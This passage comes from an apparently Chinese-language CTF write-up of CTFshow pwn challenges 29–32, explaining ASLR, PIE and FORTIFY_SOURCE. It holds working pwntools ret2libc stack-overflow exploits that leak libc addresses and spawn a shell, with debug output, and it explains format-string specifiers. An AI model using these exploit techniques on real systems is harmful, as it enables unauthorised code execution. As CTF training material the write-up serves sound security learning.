/proc/sys/kernel/randomize_va_space: Read-only file system</span><br><span class="line">Here is your ASLR level:</span><br><span class="line">0</span><br><span class="line">Let<span class="string">&#x27;s take a look at protection:</span></span><br><span class="line"><span class="string">[*] &#x27;</span>/CTFshow_pwn/pwn<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    Arch:       amd64-64-little</span></span><br><span class="line"><span class="string">    RELRO:      Full RELRO</span></span><br><span class="line"><span class="string">    Stack:      Canary found</span></span><br><span class="line"><span class="string">    NX:         NX enabled</span></span><br><span class="line"><span class="string">    PIE:        PIE enabled</span></span><br><span class="line"><span class="string">    Stripped:   No</span></span><br><span class="line"><span class="string">executable: 0x55555540083a</span></span><br><span class="line"><span class="string">system@plt: 0x7ffff7df3750</span></span><br><span class="line"><span class="string">heap: 0x5555556032a0</span></span><br><span class="line"><span class="string">stack: 0x7fffffffe3d4</span></span><br><span class="line"><span class="string">As you can see, the protection has been fully turned on and the address has been completely randomized!</span></span><br><span class="line"><span class="string">Here is your flag:</span></span><br><span class="line"><span class="string">ctfshow&#123;Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!&#125;</span></span><br></pre></td></tr></table></figure><p>故flag：ctfshow{Address_Space_Layout_Randomization&amp;&amp;Position Independent_Executable_1s_C0000000000l!}</p><h6 id="分析过程：-12"><a href="#分析过程：-12" class="headerlink" title="分析过程："></a>分析过程：</h6><p>ASLR和PIE开启后，地址都会将随机化，这里值得注意的是，由于粒度问题，虽然地址都被随机化了，但是被随机化的都仅仅是某个对象的起始地址，而在其内部还是原来的结构，也就是相对偏移是不会变化的。</p><h2 id="pwn30"><a href="#pwn30" class="headerlink" title="pwn30"></a>pwn30</h2><p>Hint：关闭PIE后,程序的基地址固定，攻击者可以更容易地确定内存中函数和变量的位置。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28145)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/home/ctfshow/libc/32bit/libc-2.27.so&#x27;)</span></span><br><span class="line">ctfshow = elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">140</span> +p32(elf.sym[<span class="string">&#x27;write&#x27;</span>]) + p32(ctfshow) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">system_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload2 = <span class="string">b&quot;B&quot;</span> * <span class="number">140</span> + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span> argv=[b<span class="string">&#x27;./pwn&#x27;</span>] : pid 756</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] <span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">[DEBUG] Sent 0xa0 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class="line">    *</span><br><span class="line">    00000080  41 41 41 41  41 41 41 41  41 41 41 41  b0 83 04 08  │AAAA│AAAA│AAAA│····│</span><br><span class="line">    00000090  f6 84 04 08  01 00 00 00  18 a0 04 08  04 00 00 00  │····│····│····│····│</span><br><span class="line">    000000a0</span><br><span class="line">[DEBUG] Received 0x4 bytes:</span><br><span class="line">    00000000  80 1b e9 f7                                         │····│</span><br><span class="line">    00000004</span><br><span class="line">/CTFshow_pwn/exp.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  binsh_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + next(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">[DEBUG] Sent 0x98 bytes:</span><br><span class="line">    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│</span><br><span class="line">    *</span><br><span class="line">    00000080  42 42 42 42  42 42 42 42  42 42 42 42  30 a4 dc f7  │BBBB│BBBB│BBBB│0···│</span><br><span class="line">    00000090  f6 84 04 08  e8 ed f3 f7                            │····│····│</span><br><span class="line">    00000098</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b<span class="string">&#x27;ls\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0xb bytes:</span><br><span class="line">    b<span class="string">&#x27;exp.py\tpwn\n&#x27;</span></span><br><span class="line">exp.pypwn</span><br></pre></td></tr></table></figure><h6 id="分析过程：-13"><a href="#分析过程：-13" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位程序开启NX，部分开启RELRO保护</p><p>IDA查看跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">132</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里存在明显的溢出点</p><p>buf ，用于存储从标准输入读取的数据。该变量在栈上分配，相对于函数栈帧指针 ebp 的偏移为-0x88 .调用 read 函数从标准输入读取数据。 read 函数的第一个参数是文件描述符，这里使用 0 表示标准入。第二个参数是指向存储数据的缓冲区的指针，这里是 &amp;buf 。第三个参数是要读取的最大字节数，这里是0x100u ，即 256 字节。</p><p>程序中无system也没有“&#x2F;bin&#x2F;sh”字符串，也可以使用ret2libc的方法进行get shell 后面到该部分会进行详细讲解，同样在这里仅仅是为了演示在关闭Canary和PIE保护，开启NX保护时的一种攻击手法。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ gdb ./pwn</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">^c</span><br><span class="line">pwndbg&gt; cyclic 500</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaae</span><br><span class="line">*EIP  0x6261616b (<span class="string">&#x27;kaab&#x27;</span>)</span><br><span class="line">pwndbg&gt; cyclic -l kaab</span><br><span class="line">Finding cyclic pattern of 4 bytes: b<span class="string">&#x27;kaab&#x27;</span> (hex: 0x6b616162)</span><br><span class="line">Found at offset 140</span><br></pre></td></tr></table></figure><h2 id="pwn31"><a href="#pwn31" class="headerlink" title="pwn31"></a>pwn31</h2><p>Hint：开启 ALSR 和 PIE 的情况下，仍可能被利用</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;127.0.0.1&#x27;,10000)</span></span><br><span class="line"><span class="comment">#io = remote(&quot;pwn.challenge.ctf.show&quot;,28161)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/home/ctfshow/libc/32bit/libc-2.27.so&#x27;)</span></span><br><span class="line">main = <span class="built_in">int</span>(io.recvline(),<span class="number">16</span>)</span><br><span class="line"><span class="comment">#print hex(main)</span></span><br><span class="line">base = main - elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ctfshow = base + elf.sym[<span class="string">&#x27;ctfshow&#x27;</span>]</span><br><span class="line">write_plt = base + elf.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = base + elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">ebx = base + <span class="number">0x1fc0</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">132</span> + p32(ebx) + <span class="string">b&quot;AAAA&quot;</span> + p32(write_plt) + p32(ctfshow) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">write = u32(io.recv())</span><br><span class="line">libc_base = write - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&quot;B&quot;</span> * <span class="number">140</span> + p32(system_addr) + p32(ctfshow) + p32(binsh_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">   $ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./pwn&#x27;</span> argv=[b<span class="string">&#x27;./pwn&#x27;</span>] : pid 781</span><br><span class="line">[*] <span class="string">&#x27;/CTFshow_pwn/pwn&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br><span class="line">[*] <span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">[DEBUG] Received 0xb bytes:</span><br><span class="line">    b<span class="string">&#x27;0x56555652\n&#x27;</span></span><br><span class="line">[DEBUG] Sent 0xa0 bytes:</span><br><span class="line">    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class="line">    *</span><br><span class="line">    00000080  41 41 41 41  c0 6f 55 56  41 41 41 41  b0 54 55 56  │AAAA│·oUV│AAAA│·TUV│</span><br><span class="line">    00000090  1d 56 55 56  01 00 00 00  dc 6f 55 56  04 00 00 00  │·VUV│····│·oUV│····│</span><br><span class="line">    000000a0</span><br><span class="line">[DEBUG] Received 0x4 bytes:</span><br><span class="line">    00000000  80 1b e9 f7                                         │····│</span><br><span class="line">    00000004</span><br><span class="line">/CTFshow_pwn/exp.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  binsh_addr = libc_base + next(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">[DEBUG] Sent 0x98 bytes:</span><br><span class="line">    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│</span><br><span class="line">    *</span><br><span class="line">    00000080  42 42 42 42  42 42 42 42  42 42 42 42  30 a4 dc f7  │BBBB│BBBB│BBBB│0···│</span><br><span class="line">    00000090  1d 56 55 56  e8 ed f3 f7                            │·VUV│····│</span><br><span class="line">    00000098</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    b<span class="string">&#x27;ls\n&#x27;</span></span><br><span class="line">[DEBUG] Received 0xb bytes:</span><br><span class="line">    b<span class="string">&#x27;exp.py\tpwn\n&#x27;</span></span><br><span class="line">exp.pypwn</span><br></pre></td></tr></table></figure><h6 id="分析过程：-14"><a href="#分析过程：-14" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec查看保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>32位程序仅关闭Canary保护</p><p>IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, main);</span><br><span class="line">  ctfshow(&amp;argc);</span><br><span class="line">  <span class="built_in">puts</span>(asc_854);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8C8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_944);</span><br><span class="line">  <span class="built_in">puts</span>(asc_9D0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_A60);</span><br><span class="line">  <span class="built_in">puts</span>(asc_AE4);</span><br><span class="line">  <span class="built_in">puts</span>(asc_B78);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Type  : Linux_Security_Mechanisms                               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Site  : https://ctf.show/                                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * Hint  : Bypass ALSR &amp; PIE &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;    * *************************************                           &quot;</span>);</span><br><span class="line">  write(<span class="number">0</span>, <span class="string">&quot;Hello CTFshow!\n&quot;</span>, <span class="number">0xEu</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到程序先打印出main函数的地址，然后跟进ctfshow函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __cdecl <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">132</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样的，这里还是有溢出，但是开启了保护不同了，使用上一题的exp肯定是打不了了</p><p>既然程序已经给我们main函数的地址了，那么我们就可以通过计算偏移得到程序本身的加载地址</p><p>这也就是与上一题不同的地方</p><h2 id="pwn32"><a href="#pwn32" class="headerlink" title="pwn32"></a>pwn32</h2><p>Hint：FORTIFY_SOURCE&#x3D;0：禁用 Fortify 功能。 不会进行任何额外的安全检查。 可能导致潜在的安全漏洞。ssh <a href="mailto:&#99;&#116;&#102;&#x73;&#104;&#111;&#x77;&#64;&#112;&#x77;&#110;&#46;&#99;&#x68;&#x61;&#x6c;&#x6c;&#101;&#x6e;&#103;&#x65;&#46;&#99;&#x74;&#102;&#46;&#x73;&#x68;&#x6f;&#119;">ctfshow@pwn.challenge.ctf.show</a> -p28177</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FORTIFY_SOURCE 是一个 C/C++ 编译器提供的安全保护机制，旨在防止缓冲区溢出和其他与字符串和内存操作相关的安全漏洞。它是在编译时自动插入的一组额外代码，用于增强程序对于缓冲区溢出和其他常见安全问题的防护。</span><br><span class="line">FORTIFY_SOURCE 提供了以下主要功能：</span><br><span class="line">1. 运行时长度检查：FORTIFY_SOURCE 会在编译时自动将长度检查代码插入到一些危险的库函数中，例如strcpy 、 strcat 、 sprintf 等。这些代码会检查目标缓冲区的长度，以确保操作不会导致溢出。如果检测到溢出情况，程序会立即终止，从而防止潜在的漏洞利用。</span><br><span class="line">2. 缓冲区溢出检测：FORTIFY_SOURCE 还会将额外的保护机制添加到一些敏感的库函数中，例如 memcpy、memmove 、 memset 等。这些机制可以检测传递给这些函数的源和目标缓冲区是否有重叠，并防止潜在的缓冲区溢出。</span><br><span class="line">3. 安全警告和错误报告：当 FORTIFY_SOURCE 检测到潜在的缓冲区溢出或其他安全问题时，它会生成相应的警告和错误报告。</span><br><span class="line">FORTIFY_SOURCE 提供了一层额外的安全保护，它可以在很大程度上减少常见的缓冲区溢出和字符串操作相关的安全漏洞。</span><br><span class="line">`**运行时检测到溢出会调用 abort() 终止程序，避免漏洞被利用。**`</span><br><span class="line">printf、sprintf、fprintf等）的格式化字符串占位符:</span><br><span class="line">1.%p：以十六进制形式输出指针（内存地址）的值，通常用于调试。</span><br><span class="line">2.%n：不输出内容，而是将当前已输出的字符数写入对应的参数（指针）位置。</span><br><span class="line"> 变种：</span><br><span class="line">%hn：写入 2 字节（short类型）。</span><br><span class="line">%hhn：写入 1 字节（char类型）。</span><br><span class="line">%ln：写入 8 字节（long类型，64 位系统）。</span><br><span class="line">3.%2$x：输出第 2 个参数的值，以十六进制形式表示。</span><br><span class="line">$：指定参数位置（1\(表示第1个参数，2\)表示第 2 个，依此类推）。</span><br><span class="line">x：以小写十六进制输出。</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh ctfshow@题目地址 -p题目端口号</span><br><span class="line">...</span><br><span class="line">ctfshow@pwn.challenge.ctf.show<span class="string">&#x27;s password: #输入密码 123456 进行连接</span></span><br><span class="line"><span class="string">$ ./pwnme aaaaaa bbbbb ccccc ddddd</span></span><br><span class="line"><span class="string">* ************************************* </span></span><br><span class="line"><span class="string">* Classify: CTFshow --- PWN --- 入门</span></span><br><span class="line"><span class="string">* Type  : Linux_Security_Mechanisms     </span></span><br><span class="line"><span class="string">* Site  : https://ctf.show/    </span></span><br><span class="line"><span class="string">* Hint  : FORTIFY 0 1 2   </span></span><br><span class="line"><span class="string">* ************************************* </span></span><br><span class="line"><span class="string">aaaaaa CTFshowPWN</span></span><br><span class="line"><span class="string">aaaaaa aaaaaa</span></span><br><span class="line"><span class="string">aaaaaa</span></span><br><span class="line"><span class="string">aaaaaa</span></span><br><span class="line"><span class="string">The source code of these three programs is the same, and the results of turning on different levels of protection are understood</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You should understand the role of these protections!But don&#x27;</span>t just get a flag</span><br><span class="line">Here is your flag:</span><br><span class="line"></span><br><span class="line">ctfshow&#123;...&#125;</span><br></pre></td></tr></table></figure><h6 id="分析过程：-15"><a href="#分析过程：-15" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        PIE enabled</span><br></pre></td></tr></table></figure><p>IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__gid_t</span> egid; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+4h] [rbp-44h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf2[<span class="number">11</span>]; <span class="comment">// [rsp+Ah] [rbp-3Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf1[<span class="number">11</span>]; <span class="comment">// [rsp+15h] [rbp-33h] BYREF</span></span><br><span class="line"></span><br><span class="line">  egid = getegid();</span><br><span class="line">  setresgid(egid, egid, egid);</span><br><span class="line">  logo();</span><br><span class="line">  v4 = argv[<span class="number">1</span>];</span><br><span class="line">  *(_QWORD *)buf1 = *(_QWORD *)v4;</span><br><span class="line">  *(_WORD *)&amp;buf1[<span class="number">8</span>] = *((_WORD *)v4 + <span class="number">4</span>);</span><br><span class="line">  buf1[<span class="number">10</span>] = v4[<span class="number">10</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, <span class="string">&quot;CTFshowPWN&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  n = strtol(argv[<span class="number">3</span>], <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(buf1, argv[<span class="number">2</span>], n);</span><br><span class="line">  <span class="built_in">strcpy</span>(buf2, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n&quot;</span>, buf1, buf2);</span><br><span class="line">  fgets(buf1, <span class="number">11</span>, _bss_start);</span><br><span class="line">  <span class="built_in">printf</span>(buf1, &amp;num);</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; <span class="number">4</span> )</span><br><span class="line">    Undefined();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然，第一题关闭了此保护，输入的argv1明显会导致buf1溢出，但是程序仍可以正常运行：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn aaaaaaaaaaaa bbbbbbbbbbbb 6</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : FORTIFY 0 1 2</span><br><span class="line">    * *************************************</span><br><span class="line">aaaaaaaaaaa CTFshowPWN</span><br><span class="line">a aaaaaaaaaaaa</span><br><span class="line">%2<span class="variable">$x</span></span><br><span class="line">fbad2288</span><br></pre></td></tr></table></figure><p>而在本题需要获取flag，仅仅需要关注到最后的Undefined函数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000092A                 public Undefined</span><br><span class="line">.text:000000000000092A Undefined       proc near               ; CODE XREF: main+117↓p</span><br><span class="line">.text:000000000000092A</span><br><span class="line">.text:000000000000092A flag            = byte ptr -48h</span><br><span class="line">.text:000000000000092A</span><br><span class="line">.text:000000000000092A ; __unwind &#123;</span><br><span class="line">.text:000000000000092A                 push    rbx</span><br><span class="line">.text:000000000000092B                 sub     rsp, 40h</span><br><span class="line">.text:000000000000092F                 lea     rdi, s          ; &quot;The source code of these three programs&quot;...</span><br><span class="line">.text:0000000000000936                 call    _puts</span><br><span class="line">.text:000000000000093B                 lea     rdi, aYouShouldUnder ; &quot;You should understand the role of these&quot;...</span><br><span class="line">.text:0000000000000942                 call    _puts</span><br><span class="line">.text:0000000000000947                 lea     rsi, modes      ; &quot;r&quot;</span><br><span class="line">.text:000000000000094E                 lea     rdi, filename   ; &quot;/ctfshow_flag&quot;</span><br><span class="line">.text:0000000000000955                 call    _fopen</span><br><span class="line">.text:000000000000095A f = rax                                 ; FILE *</span><br><span class="line">.text:000000000000095A                 test    f, f</span><br><span class="line">.text:000000000000095D                 jz      short loc_980</span><br><span class="line">.text:000000000000095F                 mov     rbx, rsp</span><br><span class="line">.text:0000000000000962                 mov     rdx, f          ; stream</span><br><span class="line">.text:0000000000000965                 mov     esi, 40h ; &#x27;@&#x27;  ; n</span><br><span class="line">.text:000000000000096A                 mov     rdi, rbx        ; s</span><br><span class="line">.text:000000000000096D                 call    _fgets</span><br><span class="line">.text:0000000000000972                 mov     rdi, rbx        ; s</span><br><span class="line">.text:0000000000000975                 call    _puts</span><br><span class="line">.text:000000000000097A                 add     rsp, 40h</span><br><span class="line">.text:000000000000097E                 pop     rbx</span><br><span class="line">.text:000000000000097F                 retn</span><br><span class="line">.text:0000000000000980 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000000980</span><br><span class="line">.text:0000000000000980 loc_980:                                ; CODE XREF: Undefined+33↑j</span><br><span class="line">.text:0000000000000980 f = rax                                 ; FILE *</span><br><span class="line">.text:0000000000000980                 lea     rdi, aCtfshowFlagNoS ; &quot;/ctfshow_flag: No such file or director&quot;...</span><br><span class="line">.text:0000000000000987                 call    _puts</span><br><span class="line">.text:000000000000098C                 mov     edi, 0          ; status</span><br><span class="line">.text:0000000000000991                 call    _exit</span><br><span class="line">.text:0000000000000991 ; &#125; // starts at 92A</span><br><span class="line">.text:0000000000000991 Undefined       endp</span><br></pre></td></tr></table></figure><p>同样的它将flag打开并打印出来</p><p>这里仅仅有一个判断你输入的参数是否大于4，当大于4时即可拿到flag</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn aaaaaaaaaaaa bbbbbbbbbbbb 6 flag</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : FORTIFY 0 1 2</span><br><span class="line">    * *************************************</span><br><span class="line">aaaaaaaaaaa CTFshowPWN</span><br><span class="line">a aaaaaaaaaaaa</span><br><span class="line">%p</span><br><span class="line">0x7fffffffe354</span><br><span class="line">The <span class="built_in">source</span> code of these three programs is the same, and the results of turning on different levels of protection are understood</span><br><span class="line"></span><br><span class="line">You should understand the 